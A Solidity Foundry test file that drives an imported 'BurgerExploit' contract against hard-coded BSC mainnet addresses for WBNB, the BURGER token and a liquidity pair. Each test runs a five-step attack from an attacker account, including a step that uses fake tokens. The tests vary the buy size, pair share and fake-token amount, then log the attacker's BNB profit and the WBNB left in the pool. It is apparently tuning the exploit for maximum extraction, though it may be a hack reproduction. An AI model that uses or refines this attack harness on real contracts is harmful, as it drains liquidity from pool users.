// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest10 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;

    function test_10000_16() public { _run(10000 ether, 16); }
    function test_10000_17() public { _run(10000 ether, 17); }
    function test_10000_18() public { _run(10000 ether, 18); }
    function test_10000_19() public { _run(10000 ether, 19); }

    // Try also varying the fakeToken amount used in step4
    // Maybe using more fakeTokens extracts more
    function test_10000_15_moreFake() public {
        _runCustom(10000 ether, 15, 90 ether);
    }

    function test_10000_15_lessFake() public {
        _runCustom(10000 ether, 15, 20 ether);
    }

    function _run(uint256 buyAmount, uint256 pairPct) internal {
        _runCustom(buyAmount, pairPct, 50 ether);
    }

    function _runCustom(uint256 buyAmount, uint256 pairPct, uint256 fakeAmountIn) internal {
        address att = makeAddr("att");
        uint256 startBnb = buyAmount + 500 ether;
        vm.deal(att, startBnb);
        vm.startPrank(att);

        BurgerExploit e = new BurgerExploit();
        e.step1_setup{value: buyAmount + 200 ether}();
        e.step2_buyBurger(buyAmount);

        uint256 bBal = IERC20(BURGER).balanceOf(address(e));
        uint256 forPair = bBal * pairPct / 100;

        e.step3_createPair(100 ether, forPair);
        e.step4_attack(fakeAmountIn);
        e.step5_unwrap();

        int256 profit = int256(att.balance) - int256(startBnb);
        string memory pSign = profit >= 0 ? "+" : "-";
        uint256 absProfit = profit >= 0 ? uint256(profit) : uint256(-profit);
        emit log_string(string.concat(
            "buy=", vm.toString(buyAmount / 1 ether),
            " pct=", vm.toString(pairPct),
            " fake=", vm.toString(fakeAmountIn / 1 ether),
            " profit=", pSign, vm.toString(absProfit / 1 ether), " BNB"
        ));

        address pair = 0x7ac55ac530f2C29659573Bde0700c6758D69e677;
        (,uint112 r1,) = IDemaxPair(pair).getReserves();
        emit log_named_uint("WBNB remaining", r1);

        vm.stopPrank();
    }
}
